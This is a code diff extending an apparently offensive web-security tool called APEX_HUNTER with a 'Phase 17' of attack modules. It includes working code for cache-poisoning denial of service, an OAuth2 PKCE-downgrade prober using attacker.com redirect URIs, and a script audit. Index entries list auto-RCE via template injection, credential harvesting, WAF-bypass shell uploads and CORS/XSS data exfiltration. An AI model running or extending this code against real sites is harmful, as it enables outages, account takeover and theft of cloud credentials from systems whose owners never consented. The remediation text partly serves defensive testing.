+        {"X-Original-URL":  "/.invalid-path-that-does-not-exist-apex"},
+        {"X-Rewrite-URL":   "/.invalid-path-that-does-not-exist-apex"},
+        {"X-HTTP-Method-Override": "DELETE"},
+        {"Transfer-Encoding": "chunked", "Content-Length": "0"},
+    ]
+    CACHEABLE_PATHS = ["/", "/index.html", "/robots.txt",
+                       "/api/config", "/static/main.js", "/api/version"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CACHE-POISON-DOS-383: Poison CDN/proxy cache with error responses for DoS")
+        base = profile.url.rstrip("/")
+        if not profile.waf:
+            info("  No CDN/WAF detected — cache poisoning unlikely")
+            return profile
+        hits = []
+        for path in self.CACHEABLE_PATHS:
+            # Get clean baseline
+            r_clean = _fetch(f"{base}{path}", cfg.ua, cfg.timeout)
+            if r_clean.status in (0, 404):
+                continue
+            clean_status = r_clean.status
+            for poison_hdr in self.POISON_HEADERS:
+                r_poisoned = _fetch(f"{base}{path}", cfg.ua, cfg.timeout,
+                                    extra_headers=poison_hdr)
+                if r_poisoned.status == 0:
+                    continue
+                # Check if cached response header is present
+                cache_hit = r_poisoned.headers.get("x-cache", "").lower()
+                age = r_poisoned.headers.get("age", "")
+                cf_cache = r_poisoned.headers.get("cf-cache-status", "").lower()
+                if r_poisoned.status != clean_status:
+                    if "hit" in cache_hit or age or "hit" in cf_cache:
+                        hits.append({
+                            "path": path,
+                            "header": list(poison_hdr.items())[0],
+                            "poisoned_status": r_poisoned.status,
+                            "clean_status": clean_status,
+                        })
+                        high(f"  Cache poisoning DoS: {path} "
+                             f"clean={clean_status} poisoned={r_poisoned.status}")
+        if hits:
+            h = hits[0]
+            profile.findings.append(Finding(
+                id="P17-CACHE-POISON-DOS-001",
+                title=f"Cache Poisoning DoS — {h['path']} cached as HTTP {h['poisoned_status']}",
+                severity="HIGH", cvss=7.5, cwe="CWE-444",
+                description=(
+                    f"Injecting {h['header'][0]}: {h['header'][1]} causes the CDN to cache "
+                    f"an error response (HTTP {h['poisoned_status']}) for {h['path']}. "
+                    f"All users receive the error response until the cache TTL expires. "
+                    f"No rate-limiting mitigates this — a single request creates prolonged DoS."
+                ),
+                evidence="\n".join(
+                    f"{x['path']} via {x['header'][0]}={x['header'][1]} → "
+                    f"HTTP {x['clean_status']}→{x['poisoned_status']}"
+                    for x in hits[:4]
+                ),
+                reproduction=(
+                    f"curl -sk '{base}{h['path']}' -H '{h['header'][0]}: {h['header'][1]}'\n"
+                    f"# Now observe cached error response from clean request"
+                ),
+                poc_curl=(
+                    f"curl -sk '{base}{h['path']}' -H '{h['header'][0]}: {h['header'][1]}' -D -\n"
+                    f"curl -sk '{base}{h['path']}' -D -  # observe poisoned cache response"
+                ),
+                category="Cache Poisoning / DoS",
+                remediation=(
+                    "Configure CDN to exclude unkeyed headers (X-Forwarded-Host, X-Original-URL) "
+                    "from the cache key. Normalize requests before caching. "
+                    "Set Cache-Control: no-store on sensitive or dynamic endpoints."
+                )
+            ))
+        else:
+            info("  No cache poisoning DoS confirmed")
+        return profile
+
+
+# ── t384: OAuth2 PKCE Downgrade Chain ───────────────────────
+class OAuth2PKCEDowngradeChain:
+    """Detect OAuth2 authorization endpoints that accept authorization
+    code requests without a PKCE code_challenge, or that accept a
+    plain code_challenge_method, enabling authorization code theft ATO."""
+    NAME = "OAuth2 PKCE Downgrade Chain"
+    AUTH_PATHS = [
+        "/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
+        "/connect/authorize", "/oauth/auth", "/api/oauth/authorize",
+        "/openid/authorize", "/.well-known/openid-configuration",
+    ]
+    CLIENT_IDS = ["app", "client", "web", "mobile", "spa", "public",
+                  "frontend", "react-app", "angular-app"]
+    REDIRECT_URIS = [
+        "https://attacker.com/callback",
+        "http://localhost:3000/callback",
+        "https://evil.com",
+    ]
+
+    def _find_oauth_config(self, base: str, cfg: Config) -> Optional[Dict]:
+        for path in ["/.well-known/openid-configuration",
+                     "/.well-known/oauth-authorization-server"]:
+            r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout)
+            if r.status == 200:
+                try:
+                    return json.loads((r.body or b"").decode("utf-8", errors="replace"))
+                except Exception:
+                    pass
+        return None
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("OAUTH2-PKCE-DOWN-384: PKCE code_challenge downgrade for authorization code theft")
+        base = profile.url.rstrip("/")
+        # Discover auth endpoint
+        oidc_config = self._find_oauth_config(base, cfg)
+        auth_endpoints = []
+        if oidc_config:
+            ep = oidc_config.get("authorization_endpoint", "")
+            if ep:
+                auth_endpoints.append(ep if ep.startswith("http") else f"{base}{ep}")
+            pkce_methods = oidc_config.get("code_challenge_methods_supported", [])
+            if "plain" in pkce_methods:
+                warn(f"  OAuth supports plain PKCE (weak!): {pkce_methods}")
+        for path in self.AUTH_PATHS:
+            auth_endpoints.append(f"{base}{path}")
+        hits = []
+        for auth_url in auth_endpoints[:6]:
+            for client_id in self.CLIENT_IDS[:4]:
+                for redirect in self.REDIRECT_URIS[:2]:
+                    # Test without code_challenge (PKCE bypass)
+                    params_no_pkce = (
+                        f"response_type=code&client_id={client_id}"
+                        f"&redirect_uri={urllib.parse.quote(redirect)}"
+                        f"&scope=openid+profile+email&state=apex_state_test"
+                    )
+                    r = _fetch(f"{auth_url}?{params_no_pkce}", cfg.ua, cfg.timeout)
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    # Positive: returned a code OR redirected with code (not an error about PKCE)
+                    if r.status in (200, 302, 303):
+                        loc = r.headers.get("location", "")
+                        has_code = "code=" in loc or "code=" in body
+                        no_pkce_error = not any(err in body.lower() for err in
+                                                ["pkce", "code_challenge", "required",
+                                                 "invalid_request"])
+                        if has_code or (r.status == 200 and no_pkce_error and
+                                        any(k in body.lower() for k in
+                                            ["login", "authorize", "sign in"])):
+                            hits.append({
+                                "endpoint": auth_url, "client_id": client_id,
+                                "redirect": redirect, "status": r.status,
+                                "code_in_response": has_code,
+                            })
+                            if has_code:
+                                high(f"  PKCE bypass confirmed: {auth_url} client={client_id}")
+                            else:
+                                ok(f"  PKCE not enforced (no error): {auth_url}")
+        if hits:
+            h = hits[0]
+            profile.findings.append(Finding(
+                id="P17-PKCE-DOWNGRADE-001",
+                title=(f"OAuth2 PKCE Not Enforced — authorization code theft possible: "
+                       f"{h['endpoint']}"),
+                severity="HIGH", cvss=8.1, cwe="CWE-303",
+                description=(
+                    f"The OAuth2 authorization endpoint {h['endpoint']} accepts authorization "
+                    f"code requests without a PKCE code_challenge. "
+                    f"Public clients (SPAs, mobile apps) are vulnerable to authorization code "
+                    f"interception attacks — an attacker who obtains the code can exchange it "
+                    f"for tokens without knowing the original code_verifier."
+                ),
+                evidence="\n".join(
+                    f"endpoint={x['endpoint']} client={x['client_id']} "
+                    f"status={x['status']} code={x['code_in_response']}"
+                    for x in hits[:3]
+                ),
+                reproduction=(
+                    f"GET {h['endpoint']}?response_type=code"
+                    f"&client_id={h['client_id']}"
+                    f"&redirect_uri={urllib.parse.quote(h['redirect'])}"
+                    f"&scope=openid&state=test\n"
+                    f"# No code_challenge required — observe auth code in redirect"
+                ),
+                poc_curl=(
+                    f"curl -sk -L '{h['endpoint']}?"
+                    f"response_type=code&client_id={h['client_id']}"
+                    f"&redirect_uri={urllib.parse.quote(h['redirect'])}"
+                    f"&scope=openid&state=test' -D -"
+                ),
+                category="OAuth2 / PKCE",
+                remediation=(
+                    "Require PKCE for all public OAuth2 clients. "
+                    "Reject authorization requests without code_challenge. "
+                    "Only accept S256 (SHA-256) code_challenge_method — never 'plain'. "
+                    "Use short-lived authorization codes (< 60 seconds)."
+                )
+            ))
+        else:
+            info("  No OAuth2 PKCE downgrade confirmed")
+        return profile
+
+
+# ── t385: Supply-Chain Third-Party Script Audit ──────────────
+class SupplyChainScriptAudit:
+    """Enumerate all third-party scripts loaded by the target, extract
+    version strings, and flag known-vulnerable versions or scripts
+    loaded without Subresource Integrity (SRI) checksums."""
+    NAME = "Supply Chain Script Audit"
+    KNOWN_VULN = {
+        "jquery": [("1\\.[0-9]\\.", "HIGH", "CVE-2019-11358/CVE-2020-7656 XSS"),
+                   ("2\\.[0-2]\\.", "HIGH", "CVE-2019-11358 prototype pollution"),
+                   ("3\\.[0-4]\\.", "MEDIUM", "CVE-2020-11022/CVE-2020-11023 XSS")],
+        "bootstrap": [("3\\.[0-3]\\.", "MEDIUM", "CVE-2016-10735 XSS"),
+                      ("4\\.[0-3]\\.", "MEDIUM", "CVE-2019-8331 XSS")],
+        "angular": [("1\\.[0-5]\\.", "HIGH", "CVE-2019-14863 XSS"),
+                    ("1\\.[6-7]\\.", "MEDIUM", "known sandbox escapes")],
+        "lodash": [("[1-3]\\.", "HIGH", "CVE-2019-10744 prototype pollution"),
+                   ("4\\.[0-9]\\.", "MEDIUM", "CVE-2021-23337 command injection")],
+        "moment": [("2\\.(?:1[0-9]|2[0-8])\\.", "MEDIUM", "CVE-2022-31129 ReDoS")],
+    }
+    SCRIPT_RE = re.compile(
+        r'<script[^>]+src=["\']([^"\']+)["\']([^>]*?)>',
+        re.I | re.S
+    )
+    VERSION_RE = re.compile(r'[@/]([\d]+\.[\d]+(?:\.[\d]+)?)', re.I)
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SUPPLY-CHAIN-AUDIT-385: Third-party script version audit + SRI gap analysis")
+        base = profile.url.rstrip("/")
+        r = _fetch(base, cfg.ua, cfg.timeout)
+        html_body = (r.body or b"").decode("utf-8", errors="replace")
+        if r.status == 0 or not html_body:
+            info("  Could not fetch main page for script audit")
+            return profile
+        scripts = self.SCRIPT_RE.findall(html_body)
+        third_party = []
+        no_sri = []
+        vuln_findings = []
+        for src, attrs in scripts:
+            if not src.startswith("http") and not src.startswith("//"):
+                continue  # local script
+            full_src = "https:" + src if src.startswith("//") else src
+            has_integrity = "integrity=" in attrs.lower()
+            has_crossorigin = "crossorigin=" in attrs.lower()
+            if not has_integrity:
+                no_sri.append(full_src)
+            third_party.append({"src": full_src, "sri": has_integrity})
+            # Version-based vulnerability check
+            ver_m = self.VERSION_RE.search(full_src)
+            version = ver_m.group(1) if ver_m else None
+            if not version:
+                continue
+            src_lo = full_src.lower()
+            for lib, vuln_list in self.KNOWN_VULN.items():
+                if lib in src_lo:
+                    for ver_pattern, sev, desc in vuln_list:
+                        if re.search(ver_pattern, version):
+                            vuln_findings.append({
+                                "src": full_src, "lib": lib, "ver": version,
+                                "severity": sev, "cve": desc, "has_sri": has_integrity
+                            })
+                            warn(f"  Vulnerable {lib} {version}: {desc}")
+        ok(f"  {len(third_party)} third-party scripts, {len(no_sri)} without SRI, "
+           f"{len(vuln_findings)} known-vulnerable")
+        if vuln_findings or (len(no_sri) > 2):
+            all_issues = len(vuln_findings) + (1 if no_sri else 0)
+            sev = "HIGH" if vuln_findings else "MEDIUM"
+            cvss = 8.8 if vuln_findings else 6.1
+            profile.findings.append(Finding(
+                id="P17-SUPPLY-CHAIN-001",
+                title=(f"Supply Chain Risk: {len(vuln_findings)} vulnerable script(s), "
+                       f"{len(no_sri)} without SRI"),
+                severity=sev, cvss=cvss, cwe="CWE-1104",
+                description=(
+                    f"{len(third_party)} third-party scripts loaded. "
+                    + (f"{len(vuln_findings)} use known-vulnerable versions ({'; '.join(x['cve'] for x in vuln_findings[:3])}). " if vuln_findings else "")
+                    + (f"{len(no_sri)} lack Subresource Integrity (SRI) — "
+                       f"any CDN compromise delivers malicious code to all users." if no_sri else "")
+                ),
+                evidence=(
+                    "\n".join(f"VULN: {x['lib']} {x['ver']} — {x['cve']}: {x['src'][:80]}"
+                               for x in vuln_findings[:5]) +
+                    ("\n" if vuln_findings and no_sri else "") +
+                    "\n".join(f"NO-SRI: {s[:80]}" for s in no_sri[:5])
+                ),
+                reproduction=(
+                    f"curl -sk '{base}' | grep -i '<script' | grep -v integrity"
+                ),
+                poc_curl=(
+                    f"curl -sk '{base}' | grep -oP 'src=\"[^\"]+\"' | grep -v '{profile.host}'"
+                ),
+                category="Supply Chain",
+                remediation=(
+                    "Add Subresource Integrity (SRI) hashes to all CDN-loaded scripts: "
+                    "<script src='...' integrity='sha384-...' crossorigin='anonymous'>. "
+                    "Pin libraries to specific known-good versions. "
+                    "Use npm audit / Dependabot for automated vulnerability tracking. "
+                    "Host critical dependencies locally where possible."
+                )
+            ))
+        else:
+            info("  No supply chain issues found")
+        return profile
+
+
+# ══════════════════════════════════════════════════════════════
 # AI ANALYZER — Claude claude-opus-4-8 powered finding analysis
 # ══════════════════════════════════════════════════════════════
 class AIAnalyzer:
@@ -15140,6 +16893,7 @@ class APEXOrchestrator:
         14: "Phase 14 [RED+BLACK TEAM]: HTTP-Smuggling-FE + CacheDeception-Adv + GatewayBypass + RaceCondition-Adv + GraphQL-Deep + OAuth2-TokenTheft + SubTakeover-Adv + XSS-AdvPayloads + JWT-SecretBrute + SSRF-AdvChain + LateralMove + Persistence + CloudStorage + CredStuffing + TLS-Attack + PwdPolicy + GQL-Schema + ZeroTrustBypass + APIVersionAbuse + BinaryAnalyzer (70 tools)",
         15: "Phase 15 [BLACK TEAM]: OAuth2-TokenHijack + HTTP-Desync-TE + JWT-SecretCrack + SubBrute + GQL-IDOR + CORS-Chain + OpenAPI-Fuzz + AzureBlob + SessionFix + CRLF-Adv + CryptoWeak + SensitiveDeep + RateLimit-Adv + APIKey-Exp + CloudPivot + FullReport + OAuth2-Re + Desync-Re + JWTCrack-Re + SubBrute-Re (20 tools)",
         16: "Phase 16 [CHAIN+BYPASS]: AuthContextHarvest + ContextualMultiStage(JWT-forge+IDOR-auth+SQLi-extract) + WAFBypassUpload(10 variants) + PostRCE-ImpactMap(14 cmds) + DynamicWAFBypass(CMDi/XSS/SQLi adapters) (5 tools)",
+        17: "Phase 17 [ADVANCED RED/BLACK TEAM]: 2ndOrder-SQLi + SSTI-AutoRCE + GitRecon + TFState + JWT-kid-Inject + DepConfusion-V2 + CRLF-SessionFix + BlindNoSQLi + SSI/ESI-Inject + SMTP-Inject + ReDoS + CSPT + API-VersionBypass + GQL-TypeIDOR + HeadlessBrowser-SSRF + CORS-XSS-Exfil + K8s-RBAC + CachePoison-DoS + OAuth2-PKCE-Down + SupplyChain-Audit (20 tools)",
     }
 
     def __init__(self, cfg: Config):
@@ -15344,6 +17098,27 @@ class APEXOrchestrator:
         self.t363 = WAFBypassUploadChain()
         self.t364 = PostRCEImpactMapper()
         self.t365 = DynamicWAFBypassAdapter()
+        # Phase 17 — Advanced Black/Red Team Chains
+        self.t366 = SecondOrderSQLiChain()
+        self.t367 = SSTIAutoExploitChain()
+        self.t368 = GitRepoReconstructor()
+        self.t369 = TerraformStateHarvester()
+        self.t370 = JWTKidInjectionChain()
+        self.t371 = DependencyConfusionV2()
+        self.t372 = CRLFSessionFixationChain()
+        self.t373 = BlindNoSQLiChain()
+        self.t374 = SSIESIInjectionProber()
+        self.t375 = SMTPHeaderInjectionChain()
+        self.t376 = ReDoSTimingProber()
+        self.t377 = ClientSidePathTraversal()
+        self.t378 = APIVersioningBypassChain()
+        self.t379 = GraphQLTypeConfusionIDOR()
+        self.t380 = HeadlessBrowserSSRF()
+        self.t381 = CORSXSSExfilChain()
+        self.t382 = KubernetesRBACEnumChain()
+        self.t383 = CachePoisoningDoSChain()
+        self.t384 = OAuth2PKCEDowngradeChain()
+        self.t385 = SupplyChainScriptAudit()
 
     def _init_profile(self, raw: str) -> TargetProfile:
         url = _normalize_target(raw)
@@ -15560,6 +17335,27 @@ class APEXOrchestrator:
                 p = self.t363.run(p, cfg)  # WAF-bypass shell upload (10 variants)
                 p = self.t364.run(p, cfg)  # post-RCE impact mapping (14 enum cmds)
                 p = self.t365.run(p, cfg)  # dynamic WAF bypass adapter (CMDi/XSS/SQLi)
+            elif n == 17:
+                p = self.t366.run(p, cfg)  # second-order SQLi chain
+                p = self.t367.run(p, cfg)  # SSTI auto-exploit (engine detect → RCE)
+                p = self.t368.run(p, cfg)  # exposed .git repo reconstructor
+                p = self.t369.run(p, cfg)  # Terraform/IaC state file harvester
+                p = self.t370.run(p, cfg)  # JWT kid SQL/path-traversal injection
+                p = self.t371.run(p, cfg)  # dependency confusion V2 (npm/PyPI)
+                p = self.t372.run(p, cfg)  # CRLF → session fixation chain
+                p = self.t373.run(p, cfg)  # blind NoSQL injection (MongoDB regex)
+                p = self.t374.run(p, cfg)  # SSI/ESI injection prober
+                p = self.t375.run(p, cfg)  # SMTP header injection chain
+                p = self.t376.run(p, cfg)  # ReDoS timing prober
+                p = self.t377.run(p, cfg)  # client-side path traversal (CSPT)
+                p = self.t378.run(p, cfg)  # API versioning bypass chain
+                p = self.t379.run(p, cfg)  # GraphQL type confusion IDOR
+                p = self.t380.run(p, cfg)  # headless browser SSRF chain
+                p = self.t381.run(p, cfg)  # CORS + reflected XSS exfil chain
+                p = self.t382.run(p, cfg)  # Kubernetes RBAC enum chain
+                p = self.t383.run(p, cfg)  # cache poisoning DoS chain
+                p = self.t384.run(p, cfg)  # OAuth2 PKCE downgrade chain
+                p = self.t385.run(p, cfg)  # supply chain script audit
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -15570,7 +17366,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  365 Tools | 375 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  385 Tools | 395 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -15608,7 +17404,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (375 Skills / 365 Tools)
+APEX_HUNTER v1.0 — Skills Index (395 Skills / 385 Tools)
 ═════════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -16007,6 +17803,28 @@ SKILL-372 Contextual multi-stage chain — JWT crack→forge admin token→admin
 SKILL-373 WAF-bypass shell upload — 10 obfuscated PHP variants: concat, base64-eval, chr(), null-byte, double-ext, MIME confusion
 SKILL-374 Post-RCE impact mapper — 14-command enum chain via confirmed RCE: uid/kernel/env/cron/SUID/root-dir
 SKILL-375 Dynamic WAF bypass adapter — re-test CMDi/XSS/SQLi findings with 15 obfuscation techniques; auto-selects working bypass
+
+PHASE 17 — Advanced Black/Red Team Chains
+SKILL-376 Second-order SQL injection chain — store SQLi payload in register/profile, trigger via search/display endpoint
+SKILL-377 SSTI auto-exploit chain — fingerprint template engine (Jinja2/Twig/Freemarker/Groovy/SpEL) then auto-deliver RCE payload
+SKILL-378 Exposed .git repo reconstructor — download HEAD/config/objects, extract committed secrets and source code
+SKILL-379 Terraform/IaC state file harvester — detect .tfstate/.tfvars/.env/.aws files; extract cloud credentials
+SKILL-380 JWT kid injection chain — SQL/path-traversal in JWT kid header to load attacker-controlled signing key
+SKILL-381 Dependency confusion V2 — extract npm/PyPI package names from manifests, verify absence on public registries
+SKILL-382 CRLF injection → session fixation chain — inject Set-Cookie via CRLF in redirect/URL parameters
+SKILL-383 Blind NoSQL injection chain — MongoDB $regex/$ne/$gt/$where boolean-blind auth bypass
+SKILL-384 SSI/ESI injection prober — Server-Side Includes exec/include and Edge Side Includes for RCE/SSRF
+SKILL-385 SMTP header injection chain — Cc/Bcc/To injection in email forms for password-reset link theft
+SKILL-386 ReDoS timing prober — catastrophically-backtracking regex patterns with statistical timing analysis
+SKILL-387 Client-side path traversal (CSPT) — frontend fetch/XHR path param hijacking to internal endpoints
+SKILL-388 API versioning bypass chain — deprecated /v0/beta/legacy endpoint enumeration for security regressions
+SKILL-389 GraphQL type confusion IDOR — node interface cross-type ID substitution for unauthorized object access
+SKILL-390 Headless browser SSRF chain — PDF/screenshot endpoint detection + file:///etc/passwd and IMDS exploitation
+SKILL-391 CORS + reflected XSS exfil chain — chain CORS wildcard with reflected XSS to steal authenticated API data
+SKILL-392 Kubernetes RBAC enumeration chain — direct K8s API + kubelet probe; namespace/secret/clusterrole enumeration
+SKILL-393 Cache poisoning DoS chain — poison CDN cache with error responses via unkeyed headers; single-request DoS
+SKILL-394 OAuth2 PKCE downgrade chain — authorization without code_challenge; plain method acceptance; code theft ATO
+SKILL-395 Supply chain third-party script audit — CDN script version fingerprint; SRI gap; known-CVE library detection
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -16014,7 +17832,7 @@ SKILL-375 Dynamic WAF bypass adapter — re-test CMDi/XSS/SQLi findings with 15 
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 365 Tools | 375 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 385 Tools | 395 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
